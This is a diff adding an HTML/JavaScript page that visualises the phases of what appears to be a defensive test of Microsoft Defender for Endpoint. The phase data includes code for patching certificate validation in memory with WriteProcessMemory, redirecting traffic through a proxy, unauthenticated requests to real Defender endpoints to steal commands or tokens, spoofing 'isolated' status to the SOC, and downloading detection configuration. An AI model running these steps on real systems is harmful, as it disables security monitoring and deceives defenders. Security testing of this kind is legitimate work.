+                            "Shellcode: xor eax,eax; inc eax; ret (always TRUE)",
+                            "WriteProcessMemory to function address",
+                            "Verify patch with ReadProcessMemory"
+                        ]
+                    },
+                    {
+                        title: "Watchdog Protection",
+                        details: [
+                            "Watchdog monitors main process PID",
+                            "Auto-restores original bytes if test crashes",
+                            "30-second timeout for automatic rollback",
+                            "Emergency recovery script on standby"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: WriteProcessMemory fails (DEP/CFG/CIG)",
+                            "PROTECTED: Patch immediately reverted by EDR",
+                            "VULNERABLE: Patch succeeds and persists",
+                            "Certificate pinning bypass = complete EDR compromise"
+                        ]
+                    }
+                ],
+                code: `// Prepare certificate bypass patch\npatchBytes := []byte{0x33, 0xC0, 0x40, 0xC3}\n// xor eax,eax; inc eax; ret - always return TRUE\n\n// Attempt memory write\nerr := WriteProcessMemory(handle, funcAddr, patchBytes)\n\nif err != nil {\n    patchBlocked = true // PROTECTED\n} else {\n    patchBlocked = false // VULNERABLE\n    // Set 30s auto-rollback timer\n    defer restoreOriginalBytes()\n}`
+            },
+            6: {
+                number: 6,
+                title: "Network Proxy Configuration",
+                severity: "medium",
+                mitre: [
+                    { id: "T1557", name: "Adversary-in-the-Middle" },
+                    { id: "T1090", name: "Proxy" }
+                ],
+                status: "actual",
+                time: "T+45s",
+                description: "Configures system proxy to test traffic interception capabilities (netsh winhttp set proxy).",
+                actions: [
+                    {
+                        title: "Proxy Configuration",
+                        details: [
+                            "Execute: netsh winhttp set proxy 127.0.0.1:8080",
+                            "Simulates Burp Suite interception setup",
+                            "Test if MsSense.exe respects proxy settings",
+                            "Monitor for certificate validation errors"
+                        ]
+                    },
+                    {
+                        title: "Traffic Interception Test",
+                        details: [
+                            "Check if MDE traffic routed through proxy",
+                            "Look for TLS/SSL errors in Event Logs",
+                            "Verify certificate pinning enforcement",
+                            "If patch succeeded, interception possible"
+                        ]
+                    },
+                    {
+                        title: "Cleanup",
+                        details: [
+                            "Restore original proxy configuration",
+                            "netsh winhttp reset proxy",
+                            "Verify MDE connectivity restored",
+                            "Log all proxy-related events"
+                        ]
+                    }
+                ],
+                code: `// Configure system proxy\ncmd := exec.Command("netsh", "winhttp", "set", "proxy",\n    "127.0.0.1:8080")\ncmd.Run()\n\n// Test if MDE traffic intercepted\n// (Certificate pinning should prevent this)\n\n// Restore original config\nexec.Command("netsh", "winhttp", "reset", "proxy").Run()`
+            },
+            7: {
+                number: 7,
+                title: "API Command Interception (Race Condition)",
+                severity: "critical",
+                mitre: [
+                    { id: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
+                    { id: "T1557", name: "Adversary-in-the-Middle" }
+                ],
+                status: "actual",
+                time: "T+50s",
+                description: "Spawns background goroutine to race MsSense.exe for commands from /edr/commands/cnc endpoint.",
+                actions: [
+                    {
+                        title: "Race Condition Attack",
+                        details: [
+                            "Spawn goroutine polling /edr/commands/cnc",
+                            "Send rapid unauthenticated requests (10/second)",
+                            "Use real Machine ID and Tenant ID",
+                            "NO Authorization or Msadeviceticket headers"
+                        ]
+                    },
+                    {
+                        title: "Command Types Targeted",
+                        details: [
+                            "isolationcommand - Device isolation",
+                            "scancommand - File/process scans",
+                            "forensicscollectioncommand - Investigation",
+                            "liveresponsecommand - Remote shell access"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: API returns 401/403 Unauthorized",
+                            "PROTECTED: Only MsSense.exe allowed to access endpoint",
+                            "VULNERABLE: Commands returned without auth",
+                            "Success = attacker can steal EDR commands"
+                        ]
+                    }
+                ],
+                code: `// API Race Condition\ngo func() {\n    for i := 0; i < requestsPerSecond; i++ {\n        endpoint := fmt.Sprintf(\n            "https://winatp-gw-eus.microsoft.com/edr/commands/cnc?MachineID=%s",\n            machineID)\n        \n        // NO AUTHENTICATION TOKEN\n        req, _ := http.NewRequest("GET", endpoint, nil)\n        resp, _ := client.Do(req)\n        \n        if resp.StatusCode == 200 {\n            // VULNERABLE: Command stolen!\n            parseCommand(resp.Body)\n        }\n    }\n}()`
+            },
+            8: {
+                number: 8,
+                title: "CloudLR Token Generation Bypass",
+                severity: "high",
+                mitre: [
+                    { id: "T1550", name: "Use Alternate Authentication Material" },
+                    { id: "T1071.001", name: "Web Protocols" }
+                ],
+                status: "actual",
+                time: "T+90s",
+                description: "Attempts to generate Cloud Live Response tokens without proper authentication.",
+                actions: [
+                    {
+                        title: "Token Request",
+                        details: [
+                            "POST to /senseir/v1/actions/ endpoint",
+                            "Request without valid authentication headers",
+                            "Attempt to obtain CloudLR session token",
+                            "Token grants command_execution capabilities"
+                        ]
+                    },
+                    {
+                        title: "Token Capabilities",
+                        details: [
+                            "command_execution - Run arbitrary commands",
+                            "file_download - Exfiltrate files from endpoint",
+                            "file_upload - Deploy additional payloads",
+                            "process_management - Kill/start processes"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: 401 Unauthorized response",
+                            "PROTECTED: Token validation enforced",
+                            "VULNERABLE: Valid token returned",
+                            "Success = remote code execution capability"
+                        ]
+                    }
+                ],
+                code: `// CloudLR token generation attempt\nendpoint := "https://winatp-gw-eus.microsoft.com/senseir/v1/actions/"\nreq, _ := http.NewRequest("POST", endpoint, requestBody)\n\n// NO AUTHENTICATION\nresp, _ := client.Do(req)\n\nif resp.StatusCode == 200 {\n    // VULNERABLE: Token granted!\n    token := parseToken(resp.Body)\n    // Can now execute commands remotely\n}`
+            },
+            9: {
+                number: 9,
+                title: "Isolation Command Spoofing",
+                severity: "high",
+                mitre: [
+                    { id: "T1562.001", name: "Impair Defenses" },
+                    { id: "T1070.006", name: "Indicator Removal: Timestomp" }
+                ],
+                status: "actual",
+                time: "T+95s",
+                description: "If isolation command intercepted, sends spoofed 'already isolated' status while maintaining full connectivity.",
+                actions: [
+                    {
+                        title: "Isolation Bypass",
+                        details: [
+                            "Intercept isolation command from Phase 7",
+                            "Send fake completion status to /commands/status",
+                            "Report 'Device successfully isolated'",
+                            "Device maintains full network connectivity"
+                        ]
+                    },
+                    {
+                        title: "Portal Deception",
+                        details: [
+                            "Microsoft Defender Portal shows 'Isolated'",
+                            "SOC team believes device is contained",
+                            "Attacker maintains full access",
+                            "Creates false sense of security"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: Command interception failed (Phase 7)",
+                            "PROTECTED: Status updates validated server-side",
+                            "VULNERABLE: Fake isolation status accepted",
+                            "Success = isolation bypass undetected"
+                        ]
+                    }
+                ],
+                code: `// Spoof isolation response\nif interceptedCommand.Type == "isolationcommand" {\n    fakeStatus := {\n        "status": "completed",\n        "message": "Device successfully isolated",\n        "timestamp": time.Now()\n    }\n    \n    // Send to status endpoint\n    http.Post(statusEndpoint, fakeStatus)\n    \n    // Device still has full connectivity!\n}`
+            },
+            10: {
+                number: 10,
+                title: "Configuration Exfiltration (8MB)",
+                severity: "critical",
+                mitre: [
+                    { id: "T1005", name: "Data from Local System" },
+                    { id: "T1071.001", name: "Web Protocols" }
+                ],
+                status: "actual",
+                time: "T+100s",
+                description: "Downloads full MDE configuration (8MB) containing detection rules, exclusions, and security policies.",
+                actions: [
+                    {
+                        title: "Configuration Download",
+                        details: [
+                            "GET /edr/config?MachineID=xxx",
+                            "Unauthenticated request for 8MB config file",
+                            "Contains complete security policy",
+                            "Save to C:\\F0\\exfiltrated_config.json"
+                        ]
+                    },
+                    {
+                        title: "Exposed Information",
+                        details: [
+                            "Detection rule patterns (RULE_POWERSHELL_*)",
+                            "File/process exclusion lists",
+                            "Monitored behaviors and thresholds",
+                            "Certificate pins and cloud endpoints",
+                            "Network infrastructure topology"
+                        ]
+                    },
+                    {
+                        title: "Attacker Value",
+                        details: [
+                            "Know exactly what detection rules are active",
+                            "Operate in exclusion paths (blind spots)",
+                            "Craft attacks to evade specific rules",
+                            "Plan infrastructure based on topology"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: 403 Forbidden response",
+                            "PROTECTED: Strong authentication required",
+                            "VULNERABLE: Full config downloaded",
+                            "Success = complete security blueprint disclosed"
+                        ]
+                    }
+                ],
+                code: `// Configuration exfiltration\nconfigURL := fmt.Sprintf(\n    "https://winatp-gw-eus.microsoft.com/edr/config?MachineID=%s",\n    machineID)\n\nresp, _ := http.Get(configURL)\n\nif resp.StatusCode == 200 {\n    // VULNERABLE: 8MB config downloaded\n    config, _ := ioutil.ReadAll(resp.Body)\n    ioutil.WriteFile("C:\\\\F0\\\\exfiltrated_config.json", config, 0644)\n    \n    // Attacker now has full security policy\n}`
+            },
+            11: {
+                number: 11,
+                title: "Final Evaluation & Exit Code Logic",
+                severity: "info",
+                mitre: [
+                    { id: "T1082", name: "System Information Discovery" }
+                ],
+                status: "actual",
+                time: "T+120s",
+                description: "Evaluates all phase results and determines final exit code (101=Vulnerable, 126=Protected).",
+                actions: [
+                    {
+                        title: "Result Evaluation",
+                        details: [
+                            "Check Phase 3: Handle acquisition status",
+                            "Check Phase 5: Memory patching status",
+                            "Check Phase 7-10: API authentication status",
+                            "Determine overall protection effectiveness"
+                        ]
+                    },
+                    {
+                        title: "Exit Code Logic",
+                        details: [
+                            "126 (ExecutionPrevented) - Phase 3 blocked",
+                            "126 (ExecutionPrevented) - Phase 5 blocked",
+                            "101 (Unprotected) - Injection & patching successful",
+                            "999 (UnexpectedTestError) - Prerequisites failed"
+                        ]
+                    },
+                    {
+                        title: "Comprehensive Logging",
+                        details: [
+                            "Save test_execution_log.json (machine-parseable)",
+                            "Save test_execution_log.txt (human-readable)",
+                            "Save process_injection_report.json",
+                            "Save memory_patch_report.json",
+                            "Save api_interception_report.json",
+                            "Generate attack_summary.txt"
+                        ]
+                    },
+                    {
+                        title: "Cleanup Operations",
+                        details: [
+                            "Verify watchdog restored all patches",
+                            "Close all process handles",
+                            "Wait 10s for delayed EDR detection",
+                            "Check if any files quarantined",
+                            "Exit with appropriate code"
+                        ]
+                    }
+                ],
+                code: `// Final evaluation logic\nvar finalExitCode int\n\nif injectionReport.BlockedByEDR {\n    // PROTECTED: Handle acquisition denied\n    Endpoint.Say("✅ RESULT: PROTECTED")\n    Endpoint.Say("System prevented process injection")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else if patchResult.Blocked {\n    // PARTIALLY PROTECTED: Injection OK but patch blocked\n    Endpoint.Say("⚠️  RESULT: PARTIALLY PROTECTED")\n    finalExitCode = Endpoint.ExecutionPrevented\n} else if writeResult.Success {\n    // VULNERABLE: Full access granted\n    Endpoint.Say("❌ RESULT: VULNERABLE")\n    Endpoint.Say("IMMEDIATE ACTION REQUIRED")\n    finalExitCode = Endpoint.Unprotected\n} else {\n    // Attack interrupted/blocked\n    finalExitCode = Endpoint.ExecutionPrevented\n}\n\nSaveLog(finalExitCode, "Final evaluation complete")\nEndpoint.Stop(finalExitCode)`
+            }
+        };
+
+        // Current active phase
+        let currentPhase = null;
+
+        // Function to create MITRE links
+        function createMitreLinks(mitreArray) {
+            return mitreArray.map(technique => {
+                const baseUrl = "https://attack.mitre.org/techniques/";
+                const techId = technique.id.replace('.', '/');
+                return `<a href="${baseUrl}${techId}" target="_blank" class="mitre-link" title="${technique.name}">${technique.id}</a>`;
+            }).join(', ');
+        }
+
+        // Initialize timeline view
+        function initializeTimeline() {
+            const timelineView = document.getElementById('timelineView');
+            let html = '';
+
+            for (let i = 1; i <= 11; i++) {
+                const phase = phaseData[i];
+                const severityColor = getSeverityColor(phase.severity);
+                const mitreText = phase.mitre.map(t => t.id).join(', ');
+
+                html += `
+                    <div class="timeline-item" onclick="showPhaseDetails(${i})">
+                        <div class="timeline-number" style="border-color: ${severityColor}; color: ${severityColor};">
+                            ${i}
+                        </div>
+                        <div class="timeline-content">
+                            <div class="timeline-title">${phase.title}</div>
+                            <div class="timeline-meta">
+                                ${phase.time} • ${mitreText} • ${phase.severity.toUpperCase()}
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            timelineView.innerHTML = html;
+        }
+
+        // Show phase details
+        function showPhaseDetails(phaseNum) {
+            currentPhase = phaseNum;
+            const phase = phaseData[phaseNum];
+            const detailsPanel = document.getElementById('detailsPanel');
+            const detailsContent = document.getElementById('detailsContent');
+
+            // Update active states
+            document.querySelectorAll('.component').forEach(comp => {
+                comp.classList.remove('active');
+            });
+            document.querySelectorAll('.timeline-item').forEach(item => {
+                item.classList.remove('active');
+            });
+
+            // Add active state to clicked component
+            const activeComponent = document.querySelector(`.component[data-phase="${phaseNum}"]`);
+            if (activeComponent) {
+                activeComponent.classList.add('active');
+            }
+
+            // Add active state to timeline item
+            const timelineItems = document.querySelectorAll('.timeline-item');
+            if (timelineItems[phaseNum - 1]) {
+                timelineItems[phaseNum - 1].classList.add('active');
+            }
+
+            // Generate details HTML
+            const severityColor = getSeverityColor(phase.severity);
+            let actionsHtml = '';
+
+            phase.actions.forEach(action => {
+                let detailsHtml = action.details.map(detail => `<li>${detail}</li>`).join('');
+                actionsHtml += `
+                    <div class="action-item">
+                        <div class="action-title">${action.title}</div>
+                        <ul class="action-details">
+                            ${detailsHtml}
+                        </ul>
+                    </div>
+                `;
+            });
+
+            const mitreLinks = createMitreLinks(phase.mitre);
+
+            detailsContent.innerHTML = `
+                <div class="details-header">
+                    <div class="details-phase-number" style="border-color: ${severityColor}; color: ${severityColor};">
+                        ${phase.number}
+                    </div>
+                    <h2 class="details-title">${phase.title}</h2>
+                    <div class="severity-badge ${phase.severity}">${phase.severity.toUpperCase()}</div>
+                    <div class="details-meta">
+                        <div class="meta-item">
+                            <span class="meta-label">MITRE:</span>
+                            <span class="meta-value">${mitreLinks}</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">Time:</span>
+                            <span class="meta-value">${phase.time}</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">Status:</span>
+                            <span class="meta-value">${phase.status === 'actual' ? '✓ Actual execution' : '⚠️ Simulated'}</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="details-section">
+                    <p style="color: #9ca3af; margin-bottom: 20px;">${phase.description}</p>
+                </div>
+
+                <div class="details-section">
+                    <h3 class="section-title">
+                        <span>🎯</span>
+                        <span>Actions Performed</span>
+                    </h3>
+                    <div class="action-list">
+                        ${actionsHtml}
+                    </div>
+                </div>
+
+                ${phase.code ? `
+                <div class="details-section">
+                    <h3 class="section-title">
+                        <span>💻</span>
+                        <span>Code Preview</span>
+                    </h3>
+                    <div class="code-preview">
+                        ${phase.code.split('\n').map(line => {
+                            if (line.startsWith('#') || line.startsWith('//')) {
+                                return `<div class="code-line code-comment">${line}</div>`;
+                            } else if (line.includes('=')) {
+                                return `<div class="code-line">${line.replace(/(\$\w+|"[^"]*"|\d+)/g, '<span class="code-highlight">$1</span>')}</div>`;
+                            } else {
+                                return `<div class="code-line">${line}</div>`;
+                            }
+                        }).join('')}
+                    </div>
+                </div>
+                ` : ''}
+            `;
+
+            // Show details panel
+            detailsPanel.classList.add('active');
+
+            // Update progress bar
+            updateProgressBar(phaseNum);
+        }
+
+        // Close details panel
+        function closeDetails() {
+            document.getElementById('detailsPanel').classList.remove('active');
+            document.querySelectorAll('.component').forEach(comp => {
+                comp.classList.remove('active');
+            });
+            document.querySelectorAll('.timeline-item').forEach(item => {
+                item.classList.remove('active');
+            });
+        }
+
+        // Switch view
+        function switchView(view) {
+            // Update button states
+            document.querySelectorAll('.view-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+
+            // Hide all views
+            document.getElementById('attackFlowView').style.display = 'none';
+            document.getElementById('timelineView').classList.remove('active');
+
+            // Show selected view
+            if (view === 'architecture') {
+                document.getElementById('attackFlowView').style.display = 'block';
+            } else if (view === 'timeline') {
+                document.getElementById('timelineView').classList.add('active');
+            }
+        }
+
+        // Get severity color
+        function getSeverityColor(severity) {
+            switch(severity) {
+                case 'critical': return '#ff4444';
+                case 'high': return '#ff9f43';
+                case 'medium': return '#ffc107';
+                case 'info': return '#4fc3f7';
+                default: return '#9ca3af';
+            }
+        }
+
+        // Update progress bar
+        function updateProgressBar(phaseNum) {
+            const progressBar = document.getElementById('progressBar');
+            const width = (phaseNum / 11) * 1300;
+            progressBar.style.width = width + 'px';
+            progressBar.style.transition = 'width 0.5s ease';
+        }
+
+        // Initialize on load
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeTimeline();
+
+            // Show phase 1 details by default
+            setTimeout(() => {
+                showPhaseDetails(1);
+            }, 1000);
+        });
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (currentPhase) {
+                if (e.key === 'ArrowRight' && currentPhase < 11) {
+                    showPhaseDetails(currentPhase + 1);
+                } else if (e.key === 'ArrowLeft' && currentPhase > 1) {
+                    showPhaseDetails(currentPhase - 1);
+                } else if (e.key === 'Escape') {
+                    closeDetails();
+                }
+            }
+        });
+    </script>
+</body>
+</html>
